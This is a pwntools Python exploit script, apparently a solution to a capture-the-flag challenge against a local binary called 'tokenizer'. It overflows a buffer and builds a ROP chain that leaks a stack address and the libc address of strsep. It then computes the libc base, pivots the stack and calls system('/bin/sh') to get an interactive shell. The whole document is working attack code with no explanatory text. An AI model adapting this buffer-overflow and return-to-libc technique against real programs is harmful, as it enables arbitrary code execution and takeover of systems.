from pwn import *
import sys
import os

context.log_level = 'debug'
context.arch = 'amd64'

libc = ELF('/lib/x86_64-linux-gnu/libc-2.28.so')
io = process('./tokenizer')
io.recvuntil('characters): ')

# rop gadgets
pop_rdi = 0x40149b
pop_rsi_r15 = 0x401499
pop_r15 = 0x40149a
jmp_cout = 0x401080
bss_cout = 0x404020
got_strsep = 0x403F98
str_tokens = 0x402009
main = 0x40133c
pop_rsp_r13_r14_r15 = 0x401495
ret = 0x401016

delim = 0xf0
payload = flat(
    'A'*8,
    pop_rdi,
    bss_cout,
    pop_rsi_r15,
    got_strsep,
    0,
    jmp_cout,
    main
)
payload = payload.replace('\x00', chr(delim))
padding = 1024 - delim + 0x20
io.sendline('a'*padding + payload + (1024 - len(payload) - padding)*'a')
io.recvuntil('truncated: ')
data = io.recvline()
delimit = data[1024:1025]
leakstack = data[1024:-1]
leakstack = u64(leakstack + (8 - len(leakstack))*'\x00')
print 'stack', hex(leakstack)
if delimit != chr(delim):
    print 'fail', delimit.encode('hex')
    sys.exit()

# gdb.attach(io, '''
# break *0x0040131c
# break *0x00401324
# conti
# x/200xg $rsp
# ''')
# sleep(3)

io.recvuntil('delimiters:')
io.sendline(chr(delim))
data = io.recvuntil('Welcome')
leaklibc = u64(data[:-7][-6:] + '\x00'*2)
print 'leak libc:', hex(leaklibc)
libc_base = leaklibc - libc.symbols['strsep']
print 'libc base:', hex(libc_base)

stack_offset = 0x7ffc01ecacf0 - 0x7ffc01eca818
new_stack_addr = leakstack - stack_offset

delim = 0x38
io.recvuntil('characters): ')
payload1 = flat(
    0,
    0,
    0,
    ret,
    pop_rdi,
    libc.search('/bin/sh').next() + libc_base,
    pop_rsi_r15,
    0,
    0,
    libc_base + libc.symbols['system'],
    main
).replace('\x00', chr(delim))

payload2 = flat(
    0,
    pop_rsp_r13_r14_r15,
    new_stack_addr
).replace('\x00', chr(delim))

io.sendline(payload1 + (1000 - len(payload1))*'X' + payload2 + (24 - len(payload2))*'X')
io.recvuntil('delimiters:')
io.sendline(chr(delim))
print io.recv()

io.interactive()